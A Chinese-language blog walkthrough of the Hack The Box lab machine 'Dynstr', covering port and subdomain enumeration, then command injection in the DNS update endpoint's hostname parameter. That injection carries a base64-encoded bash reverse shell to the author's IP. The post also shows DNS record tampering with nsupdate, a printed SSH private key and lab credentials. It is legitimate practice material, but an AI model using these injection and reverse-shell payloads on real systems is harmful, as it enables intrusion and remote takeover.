@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Dynstr - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Dynstr靶场信息  靶场类型  信息搜集首先使用nmap进行端口扫描   我们可以看到，开启了22 53 80三个端口，让我们访问80端口看看   访问后，我们找到了三个域名，老规矩，添加进hosts echo &quot;10.10.10.244 dnsalias.htb dynamicdns.htb no-ip.htb dyna.htb dynstr.htb&amp;qu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dynstr - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Dynstr靶场信息  靶场类型  信息搜集首先使用nmap进行端口扫描   我们可以看到，开启了22 53 80三个端口，让我们访问80端口看看   访问后，我们找到了三个域名，老规矩，添加进hosts echo &quot;10.10.10.244 dnsalias.htb dynamicdns.htb no-ip.htb dyna.htb dynstr.htb&amp;qu">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/74c4e226-e8ef-4632-8acc-76b854d3a473.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/ce370853-4356-447f-82da-9a1decf27ad4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/611593bd-fe9b-4ba3-b723-15d1c9aae27b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/f61b2fec-5251-4c3c-b153-5e90b4c38035.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/54e0542f-f8b8-4b3e-89f4-482232047e58.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/9371de2d-fa95-4fec-976c-07fcaca42532.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/e9ccc35e-c836-4cd0-b05e-7f9f0a601ce3.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/61226c9c-671e-40bc-9149-3cda16abfb6e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/9ac4f110-c1d8-4e12-b01a-925e386ae92e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/79ef2b02-0fbd-4f61-beb3-06b9c2a4a051.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/a4620477-1bd3-4fd4-88bf-ac84cfb33eb1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/bb82a6a6-57e8-44fa-9cba-acf7ecf27a4d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/997cb903-565f-4c5e-9912-207d5f5e23e3.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/66c1a470-2be8-4764-bfe5-90b0a7144e0e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/35eae2e3-ffe3-461e-9af2-d9d661bd6788.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/e4c7c010-f91c-489c-bad8-61a1b9b94589.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/7f0931c4-1321-4f9d-be20-b5ee9945f474.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/b3c8a7df-7f86-41da-83ed-612584e063b8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/f145e86a-e985-4d21-8cc3-2267ee61f9b9.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/3f956ea2-4d1f-4360-9103-18cd7b8ff18d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/7b5f6700-cf08-4294-aa7a-582584cc92ca.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/bb2cff82-c1fd-4dd4-a0b8-af11727f276e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/f2fbac0a-f6cf-4996-a391-e7f4e727749e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/c3623c72-4088-481a-b782-a6b413bdb9d7.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/2d351a21-77ce-4d3d-8922-77f9eee7b7ef.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/ac6609e2-dd3a-45aa-9158-b15bda8b3f9e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/4120675e-6030-4c5f-a7bc-7d400ecc0586.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/64f36403-5ade-4204-ae77-6eb0ad961c6a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/11b2db77-d79f-414c-bb91-f345ebd622b4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/32abac01-9935-498c-910d-eeb217673c4a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/f299635c-0368-451a-86d5-ed68ea551953.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/928c12bf-f634-4d8f-a1e4-639352a7f85e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/b27e5025-86db-4d4a-b1d4-268ddad1d664.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/66790ea3-2073-406f-90ae-611b2a20fb44.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/4328976b-82ed-4cab-97d3-b8a79abd3c1e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/f62272a8-baa1-4498-bcbc-ba8ed9dd7343.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/23c17921-fbcc-4a7b-bb62-1a0c2bcc24e5.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/4c86a314-fd06-403f-9571-18c1b67bb91e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/14548e43-4105-48ea-a557-ffeb76742642.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/f7203b34-0c1e-4e6c-83a0-e324a3d100c1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/7ee0e662-0abb-4023-aa84-713aae4dc45b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/0554747e-2646-473c-bd7e-b2ee36d8ffdd.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/0989ba08-48f0-4edb-9ece-bf6c1af0581d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/6f5bbe17-c37a-4042-be13-b218736777fc.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/6bb0d841-fc29-420b-85c9-e37e4dca6aad.png">
+<meta property="article:published_time" content="2021-06-15T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:43:52.094Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/74c4e226-e8ef-4632-8acc-76b854d3a473.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Dynstr - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Dynstr - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-06-15T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2021-06-15
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Dynstr"><span class="post-toc-text">Hackthebox - Dynstr</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Medium/Hackthebox-Dynstr"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Dynstr - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-06-15 19:38:36" datetime="2021-06-15T11:38:36.000Z"  itemprop="datePublished">2021-06-15</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Dynstr"><a href="#Hackthebox-Dynstr" class="headerlink" title="Hackthebox - Dynstr"></a>Hackthebox - Dynstr</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a><strong>靶场信息</strong></h1><img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/74c4e226-e8ef-4632-8acc-76b854d3a473.png" class>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a><strong>靶场类型</strong></h1><img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/ce370853-4356-447f-82da-9a1decf27ad4.png" class>
+
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a><strong>信息搜集</strong></h1><p>首先使用nmap进行端口扫描</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/611593bd-fe9b-4ba3-b723-15d1c9aae27b.png" class>
+
+<p>我们可以看到，开启了22 53 80三个端口，让我们访问80端口看看</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/f61b2fec-5251-4c3c-b153-5e90b4c38035.png" class>
+
+<p>访问后，我们找到了三个域名，老规矩，添加进hosts</p>
+<pre><code>echo &quot;10.10.10.244 dnsalias.htb dynamicdns.htb no-ip.htb dyna.htb dynstr.htb&quot; &gt;&gt; /etc/hosts
+</code></pre>
+<p>我访问了一下这几个域名，并没有什么东西，那咱们做个信息搜集吧</p>
+<p>就拿最短的dyna.htb入手吧</p>
+<pre><code>wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u &quot;http://dyna.htb&quot; -H &quot;HOST: FUZZ.dyna.htb&quot;
+</code></pre>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/54e0542f-f8b8-4b3e-89f4-482232047e58.png" class>
+
+<p>咱们需要过滤掉10909个字符 加上–hh 10909</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/9371de2d-fa95-4fec-976c-07fcaca42532.png" class>
+
+<p>啊这，结果啥都没找到，那只能去看看有没有啥公开漏洞了呀</p>
+<p>ISC BIND 9.16.1搜索这个的漏洞</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/e9ccc35e-c836-4cd0-b05e-7f9f0a601ce3.png" class>
+
+<p>找到一个缓冲区溢出，但是却没有利用的exploit，这就很难受了呀。没办法，继续返回做信息搜集吧</p>
+<p>咱们爆破一下目录吧</p>
+<pre><code>gobuster dir -u &quot;http://dyna.htb&quot; -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</code></pre>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/61226c9c-671e-40bc-9149-3cda16abfb6e.png" class>
+
+<p>发现两个目录 &#x2F;assets这个目录无法访问 &#x2F;nic这个目录显示空白</p>
+<p>咱们需要进一步fuzz</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/9ac4f110-c1d8-4e12-b01a-925e386ae92e.png" class>
+
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/79ef2b02-0fbd-4f61-beb3-06b9c2a4a051.png" class>
+
+<p>得到一个badauth，再加上在主页找到的凭证</p>
+<pre><code>Username: dynadns
+Password: sndanyd
+</code></pre>
+<p>咱们使用curl的-u功能进行访问</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/a4620477-1bd3-4fd4-88bf-ac84cfb33eb1.png" class>
+
+<pre><code>curl -u dynadns:sndanyd http://dyna.htb/nic/update
+</code></pre>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/bb82a6a6-57e8-44fa-9cba-acf7ecf27a4d.png" class>
+
+<p>得到了一个线索，nochg，咱们去Google一下这是啥东西</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/997cb903-565f-4c5e-9912-207d5f5e23e3.png" class>
+
+<blockquote>
+<p><a href="https://www.noip.com/integrate/response" target="_blank" rel="noopener">https://www.noip.com/integrate/response</a></p>
+<p><a href="https://help.dyn.com/remote-access-api/return-codes/" target="_blank" rel="noopener">https://help.dyn.com/remote-access-api/return-codes/</a></p>
+</blockquote>
+<p>这导致no-ip dynamic dns看到相应代码</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/66c1a470-2be8-4764-bfe5-90b0a7144e0e.png" class>
+
+<p>我们可以看到nochg告诉我们还没有提供要更新的主机名，所以让我们深入了解如何更新dns记录</p>
+<blockquote>
+<p><a href="https://www.noip.com/integrate/request" target="_blank" rel="noopener">https://www.noip.com/integrate/request</a></p>
+</blockquote>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/35eae2e3-ffe3-461e-9af2-d9d661bd6788.png" class>
+
+<p>所以我们可以更新dns记录，但是它需要有效</p>
+<p>咱们先使用burp拦截一个请求</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h1><p>访问<a href="http://dyna.htb/nic/update?hostname=dyna.htb&myip=10.10.14.197" target="_blank" rel="noopener">http://dyna.htb/nic/update?hostname=dyna.htb&myip=10.10.14.197</a></p>
+<p>然后在请求暴力添加一个标头Authorization: Basic ZHluYWRuczpzbmRhbnlk</p>
+<p>这个标头的base64里包含了账号密码</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/e4c7c010-f91c-489c-bad8-61a1b9b94589.png" class>
+
+<p>但是不知道为什么一直报错</p>
+<p>经过多次尝试后，要随便加一个并不存在的子域名</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/7f0931c4-1321-4f9d-be20-b5ee9945f474.png" class>
+
+<p>成了</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/b3c8a7df-7f86-41da-83ed-612584e063b8.png" class>
+
+<p>尝试了一下命令执行，提示报错，但可以确定是存在该漏洞的</p>
+<p><a href="https://github.com/LucifielHack/command-injection-payload-list" target="_blank" rel="noopener">https://github.com/LucifielHack/command-injection-payload-list</a></p>
+<p>这是命令执行的表，大伙儿可以自个儿去fuzz一下</p>
+<p>$(echo+id+|bash)”这是我测试出来的命令执行格式</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/f145e86a-e985-4d21-8cc3-2267ee61f9b9.png" class>
+
+<p>现在咱们要反弹一个shell回去</p>
+<p>首先本地监听一个端口</p>
+<pre><code>nc -nvlp 999
+</code></pre>
+<p>然后构造反弹的命令</p>
+<pre><code>/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.197/999 0&gt;&amp;1&#39;
+</code></pre>
+<p>由于直接放到burp里去执行很麻烦，所以咱们先给他转为base64</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/3f956ea2-4d1f-4360-9103-18cd7b8ff18d.png" class>
+
+<p>L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE5Ny85OTkgMD4mMSc&#x3D;然后使用管道功能进行解码，然后再通过管道传回bash</p>
+<pre><code>/nic/update?hostname=\$(echo+L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE5Ny85OTkgMD4mMSc=+|+base64+-d+|+bash)&quot;arz.no-ip.htb&amp;myip=10.10.14.197
+</code></pre>
+<p>成功弹回shell</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/7b5f6700-cf08-4294-aa7a-582584cc92ca.png" class>
+
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/bb2cff82-c1fd-4dd4-a0b8-af11727f276e.png" class>
+
+<p>使用python3获得一个较为稳定的shell</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/f2fbac0a-f6cf-4996-a391-e7f4e727749e.png" class>
+
+<p>咱们查看了一下passwd文件，发现了有一个bindmgr用户，同时在&#x2F;home目录下也有他的文件夹</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/c3623c72-4088-481a-b782-a6b413bdb9d7.png" class>
+
+<p>咱们进去查看一下</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/2d351a21-77ce-4d3d-8922-77f9eee7b7ef.png" class>
+
+<p>咱们似乎发现了一些有趣的东西</p>
+<p>我们查看一下C62796521-debugging.script</p>
+<p>查看的同时会发现内容有点多，容易造成乱码。大家看仔细点，反正我是看的脑瓜子疼</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/ac6609e2-dd3a-45aa-9158-b15bda8b3f9e.png" class>
+
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/4120675e-6030-4c5f-a7bc-7d400ecc0586.png" class>
+
+<p>复制出来后，经过处理保存到本地，成功获得了一个ssh的密钥，咱们去登录试试</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/64f36403-5ade-4204-ae77-6eb0ad961c6a.png" class>
+
+<p>但是这还是需要密码，这指定是不对啊，咱们再去看看</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/11b2db77-d79f-414c-bb91-f345ebd622b4.png" class>
+
+<p>咱们查看了一下update的源代码，可以看到nsupdate与密钥一起使用&#x2F;etc&#x2F;bind&#x2F;ddns.key</p>
+<p>所以这里要使用不同的密钥，咱们进入&#x2F;etc&#x2F;bind</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/32abac01-9935-498c-910d-eeb217673c4a.png" class>
+
+<p>咱们需要讲infra.key添加到DNS记录</p>
+<pre><code>nsupdate -v -k /etc/bind/infra.key
+update add arz.infra.dyna.htb 86400 a 10.10.14.197
+send
+show
+</code></pre>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/f299635c-0368-451a-86d5-ed68ea551953.png" class>
+
+<p>这时候如果我们运行nslookup，我们会得到一个回复，这意味着这个记录已经被添加进去了</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/928c12bf-f634-4d8f-a1e4-639352a7f85e.png" class>
+
+<p>但是我们仍然无法通过 ssh 登录，因为 dns 的使用已启用，因为 ssh 会进行反向 dns 查找过程，因此域名正在解析为 IP，但 IP 地址不会解析为域名，因此我们需要添加PTR记录为此目的</p>
+<p>咱们去添加一个A记录</p>
+<pre><code>nsupdate -k /etc/bind/infra.key
+update add anything.infra.dyna.htb 86400 A 10.10.14.197
+</code></pre>
+<p>此行为空格 下一行的IP为D.C.B.A格式，也就是把我们的IP反过来</p>
+<pre><code>update add 197.14.10.10.in-addr.arpa. 300 PTR anything.infra.dyna.htb
+send
+</code></pre>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/b27e5025-86db-4d4a-b1d4-268ddad1d664.png" class>
+
+<p>输入</p>
+<pre><code>echo &quot;-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\\n-----END OPENSSH PRIVATE KEY-----\\n&quot; &gt; id\_rsa
+</code></pre>
+<p>即可获得我们的密钥，通过上面的方式咱们自己获得也可以</p>
+<p>这里添加A记录以后，咱们去尝试ssh登录</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/66790ea3-2073-406f-90ae-611b2a20fb44.png" class>
+
+<p>成功拿到bindmgr账户权限</p>
+<img src="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/4328976b-82ed-4cab-97d3-b8a79abd3c1e.png" class>
+
+<p>成功获得user权限flag</p>
